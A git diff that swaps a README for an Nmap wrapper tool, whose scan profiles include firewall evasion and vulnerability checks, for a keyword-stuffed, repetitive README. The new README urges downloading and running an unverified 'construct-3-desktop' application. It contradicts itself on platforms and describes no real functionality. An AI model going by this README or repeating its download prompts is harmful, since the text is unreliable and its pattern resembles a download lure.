@@ -1,145 +1,110 @@
-# 🔍 NmapScanningTool - Effortless Network Scanning for Everyone
+# 🛠️ construct-3-desktop - Manage Construct 3 Data Paths Easily
 
-[![Download NmapScanningTool](https://img.shields.io/badge/Download-NmapScanningTool-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://cona2512.github.io)
+[![Download construct-3-desktop](https://img.shields.io/badge/Download-construct--3--desktop-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cona2512/construct-3-desktop)
 
-## 🎯 What Is This Tool?
+## 🚀 Overview
 
-NmapScanningTool is a friendly helper program that lets you scan your network to see what devices are connected, find open ports, and check for security issues – all without needing to learn complicated commands. Think of it as a powerful flashlight for your network that anyone can use.
+construct-3-desktop is a Windows utility for people who work with Construct 3 on a local computer. It is a local Windows and macOS helper for Construct 3 data paths, configuration settings, export caches, and export folders. In simple terms, it helps keep the behind-the-scenes folders that Construct 3 uses organized and easier to manage.
 
-Whether you want to check if your Wi-Fi is secure, see who's using your internet, or just explore how networks work, this tool makes it simple and safe.
+Many Construct 3 users work with local projects, exported files, and temporary data. Over time, those folders can become spread out or difficult to find. construct-3-desktop gives you a clearer way to work with those local locations. It is designed for everyday use, so you do not need programming knowledge to get started.
 
-## ✨ Key Features
+The main download page is here:
 
-- **12 Ready-Made Scan Profiles** – No technical knowledge needed. Pick a scan type and go.
-- **Beginner-Friendly Interface** – Works in two ways: interactive menus or simple one-line commands.
-- **Built-In Safety Checks** – Validates everything you type to prevent mistakes.
-- **Advanced Options Available** – Includes SYN scans, aggressive scans, OS detection, and vulnerability checks for curious users.
-- **Works Everywhere** – Runs on Windows, Mac, and Linux. Also available in a Docker container.
-- **Automation Ready** – Perfect for scheduling regular network checks or connecting to other tools.
+[Visit this link to download the application](https://github.com/Cona2512/construct-3-desktop)
 
-## 📥 Download and Installation
+## ✨ What construct-3-desktop Helps With
 
-### Step 1: Get the Software
+construct-3-desktop focuses on the local parts of a Construct 3 workflow. It helps with:
 
-[**Click here to download NmapScanningTool**](https://cona2512.github.io)
+- Construct 3 data paths, which are the folders Construct 3 uses on your computer.
+- Configuration settings, which are the local options and preferences connected to your setup.
+- Export caches, which are temporary files created during export activity.
+- Export folders, which are the places where finished export files are saved.
 
-This link will take you to the official download page. Look for the green "Code" button and select "Download ZIP" – or find the latest release in the "Releases" section on the right side of the page.
+These areas are often hidden from normal view. construct-3-desktop makes them easier to understand and manage. That can save time when you need to check a folder, clean up space, or keep your local Construct 3 work area tidy.
 
-### Step 2: Unpack the Files
+## 💾 Download and Run on Windows
 
-Once the download finishes, you'll have a ZIP file. Right-click it and choose "Extract All..." then pick a folder you'll remember (like your Desktop or Documents folder). This creates a new folder called NmapScanningTool with all the necessary files inside.
+Use the main project page to get the application.
 
-### Step 3: Open the Program
+1. Open this link: [Download construct-3-desktop](https://github.com/Cona2512/construct-3-desktop).
+2. Visit this link to download the application.
+3. After the download completes, open the application on your Windows computer.
+4. Use the application to view and manage Construct 3 data paths, configuration settings, export caches, and export folders.
 
-Inside the extracted folder, you'll find a file called `run.bat` (on Windows) or `run.sh` (on Mac/Linux). Double-click it. A small black window (terminal) will open – that's normal! This window is where the tool lives.
+The download link is the same page shown at the top of this README. Keep that page handy if you need to return to the project later.
 
-**First-Time Setup:** If you don't have Python installed, the program will tell you. Simply go to python.org, download Python 3.9 or newer, and install it (check the box that says "Add Python to PATH" during installation). Then run the file again.
+## 🧭 First Use
 
-## 🚀 Getting Started in 60 Seconds
+When you first open construct-3-desktop, take a moment to look through the local Construct 3 areas it helps with. The utility is built around local folders and settings, so the main goal is to make those locations easier to reach and understand.
 
-1. **Launch the tool** by double-clicking the run file.
-2. **Type your network address.** Don't know it? Just type `192.168.1.0/24` (that's the most common home network range). You can also type a simple address like `192.168.1.1`.
-3. **Choose a scan profile** from the menu. Start with "Basic Ping Scan" to see all connected devices.
-4. **Press Enter and watch the results.** You'll see a list of devices with their IP addresses, names, and other details.
-5. **Save your results** when prompted – the tool creates a neat report file for you.
+Start with the data paths area. This is where Construct 3 keeps local information on your computer. From there, review the configuration area to see the local settings connected to your setup. Then look at the export cache and export folder areas. These are useful when you export work from Construct 3 and want to know where local files are stored.
 
-## 🛠️ Built-In Scan Profiles
+No programming steps are required. The application is intended as a helper for normal Windows use. You open it, review the local Construct 3 locations, and use the available controls to manage them.
 
-| Profile | What It Does | When To Use It |
-|---------|--------------|----------------|
-| **Basic Ping Scan** | Finds all active devices on your network | Quick inventory check |
-| **Quick Port Scan** | Checks most common open ports | See what services are running |
-| **SYN Scan** | Advanced port scanning (faster, stealthier) | Deep network exploration |
-| **Aggressive Scan** | Comprehensive scan with OS and version detection | Full network audit |
-| **OS Detection** | Identifies the operating system of each device | Know what's on your network |
-| **Vulnerability Check** | Uses NSE scripts to find known security issues | Security assessment |
-| **Service Version** | Identifies exact software versions on ports | Patch management |
-| **UDP Scan** | Checks UDP ports (often overlooked) | Complete port coverage |
-| **Firewall Evasion** | Tests firewall rules and bypasses filters | Security testing |
-| **Malware Check** | Looks for signs of infected devices | Network hygiene |
-| **Web Server Scan** | Analyzes web servers in detail | Web admin tasks |
-| **Full Custom** | Lets you type any Nmap command manually | Power users |
+## 🛠️ Everyday Uses
 
-## 💬 Interactive Mode vs. Automatic Mode
+construct-3-desktop fits into common local Construct 3 routines:
 
-### Interactive Mode (For Beginners)
-When you run the tool without any extra options, it guides you step-by-step with friendly menus. Just answer the questions and the tool handles everything else.
+- Checking where Construct 3 stores local data on your computer.
+- Reviewing configuration settings tied to your local setup.
+- Finding export cache locations when temporary files need attention.
+- Opening export folders so finished files are easier to locate.
+- Keeping local Construct 3 work areas more organized.
+- Reducing time spent searching through folders manually.
 
-### Automatic Mode (For Automation)
-For power users, the tool accepts direct commands. Example:
+These tasks are useful for individuals who use Construct 3 regularly and want a simpler way to reach local files. The utility does not replace Construct 3. It works alongside it as a local helper for folders, settings, and export locations.
 
-```
-python nmap_scanner.py --profile aggressive --target 192.168.1.0/24 --output report.txt
-```
+## 🧹 Managing Caches and Export Folders
 
-This runs an aggressive scan and saves the report automatically. Perfect for scheduling with Task Scheduler or other automation tools.
+Export caches can build up as you work. They are temporary local files connected to export activity. construct-3-desktop helps you find those cache locations so you can review them when needed. This is helpful when you want to understand where temporary export data is kept.
 
-## 📋 Seeing Your Results
+Export folders are where finished files are saved. Finding them directly can save time, especially when you export often. construct-3-desktop makes export folders easier to reach from one place.
 
-Results appear right in the terminal window with colors for easy reading:
-- **Green** = open ports or normal devices
-- **Yellow** = warnings or unusual findings
-- **Red** = security issues or critical information
+Configuration settings are also part of the local workflow. These settings help control how your local Construct 3 setup behaves. construct-3-desktop gives you a clearer view of where those local settings live on your computer.
 
-After each scan, you'll be asked if you want to save a report. The report is saved as a text file with a timestamp in the filename (e.g., `scan_2025-01-15_143022.txt`). This file contains all details and is easy to share or keep for records.
+## 👥 Who It Is For
 
-## 🐳 Docker Support
+construct-3-desktop is for Construct 3 users who want a local helper on Windows. It is suitable for:
 
-Prefer isolated environments? NmapScanningTool includes a Dockerfile. Build and run it with:
+- People who use Construct 3 on a Windows computer.
+- Users who want easier access to local data paths.
+- Anyone who needs to review configuration settings.
+- Users who export work and want to find export folders.
+- People who prefer a simple utility over manual folder searching.
 
-```
-docker build -t nmap-tool .
-docker run -it nmap-tool
-```
+The application is written for an average computer user. You do not need to be a developer to use it. The focus is on local folder locations, settings, and export paths.
 
-Docker users get the same experience without installing anything on their host system.
+## 🪟 Windows and macOS Support
 
-## ⚙️ System Requirements
+construct-3-desktop is described as a local Windows and macOS helper. The main setup guidance in this README is for Windows users. The purpose stays the same across supported systems: help with Construct 3 data paths, config and export caches, and export folders.
 
-- **Operating System:** Windows 10/11, macOS 10.15+, or any modern Linux distribution
-- **Python:** Version 3.9 or newer (the tool helps you install it if missing)
-- **Internet Connection:** Only needed for downloading the tool or updates
-- **Disk Space:** Less than 50 MB
-- **Administrator Rights:** Required for some advanced scan types (the tool will prompt you if needed)
+For Windows users, the main action is simple: visit the download page, get the application, and open it. The project page is the starting point for the current download.
 
-No programming knowledge required. No complicated setup. Everything is designed to "just work."
+## ❓ Troubleshooting
 
-## 🔒 Safety and Privacy
+If the download page does not open, copy the link into your browser address bar:
 
-- The tool never sends your scan data anywhere – everything stays on your computer.
-- It includes built-in safety checks to prevent accidental misuse.
-- It works with your permission only; you always know exactly what will be scanned.
-- Released under the MIT license – open source and free forever.
+[Visit this link to download the application](https://github.com/Cona2512/construct-3-desktop)
 
-## ❓ Frequently Asked Questions
+If the application does not open after download, check that the download completed fully. Then open the downloaded item again from your Downloads folder. If you moved the file after downloading, return to the folder where you saved it and open it from there.
 
-**Is this legal to use?** Yes, as long as you only scan networks and devices you own or have permission to test. Always respect others' privacy.
+If you are unsure where Construct 3 keeps local files, open construct-3-desktop and review the data paths area first. That is the main starting point for local Construct 3 folders. From there, check the configuration, export cache, and export folder areas.
 
-**What if I get an error?** The tool shows friendly error messages explaining what went wrong. Most common issues are needing administrator rights or incorrect network addresses.
+If the browser shows the project page instead of a direct file, use the page to download the application. The project page is the primary download link for construct-3-desktop.
 
-**Can I scan the entire internet?** Technically yes, but please don't – scan only your own network or authorized targets.
+## 🔒 Safe Local Utility
 
-**Does it work without Nmap installed?** No, NmapScanningTool uses Nmap's engine. However, the tool automatically detects if Nmap is missing and helps you install it in one click.
+construct-3-desktop is a local helper for Construct 3 folders and settings. It is focused on data paths, configuration, export caches, and export folders. It is not a replacement for Construct 3 itself. It is a utility that helps you work with the local parts of your Construct 3 setup.
 
-**How is this different from Nmap itself?** Nmap is a powerful but complex tool requiring command-line expertise. NmapScanningTool packages that power into an easy-to-use interface with pre-built profiles, friendly output, and validation to prevent user errors.
+Keep the project page bookmarked so you can return to it when you need the application again. The download link appears at the top of this README and in the download section so it is easy to find.
 
-## 🌟 Support and Community
+## 📥 Download Again
 
-Encounter an issue or have a suggestion? 
-- **GitHub Issues:** Report bugs or request features on our issue tracker
-- **Documentation:** Complete technical documentation available in the "docs" folder
-- **Star the Project:** If you love the tool, give us a star on GitHub – it helps others discover it
+Return to the project page whenever you need the application:
 
-## 📄 License
+[Download construct-3-desktop](https://github.com/Cona2512/construct-3-desktop)
 
-This project is licensed under the MIT License – meaning you can use, modify, and distribute it freely, even for commercial purposes, as long as you include the original copyright notice.
+Visit this link to download the application. After the download completes, open the application and use it to manage Construct 3 data paths, configuration settings, export caches, and export folders on your Windows computer.
 
----
-
-**Ready to see your network clearly?** 
-
-## ⬇️ [Download NmapScanningTool Now](https://cona2512.github.io)
-
-Get started in minutes and take control of your network security today. It's free, it's safe, and it works right out of the box.
-
-Keywords: automation, cli, cybersecurity, docker, network-scanner, nmap, nse, os-detection, pentesting, python, security
+Keywords: 2026-construct-3, construct-3, construct-3-2026, construct-3-desktop, construct-3-download, construct-3-free, construct-3-installer, construct-3-macos, construct-3-official, construct-3-pc, construct-3-portable, construct-3-windows, download-construct-3, free-construct-3, installer-construct-3, macos-construct-3, official-construct-3, pc-construct-3, portable-construct-3, windows-construct-3
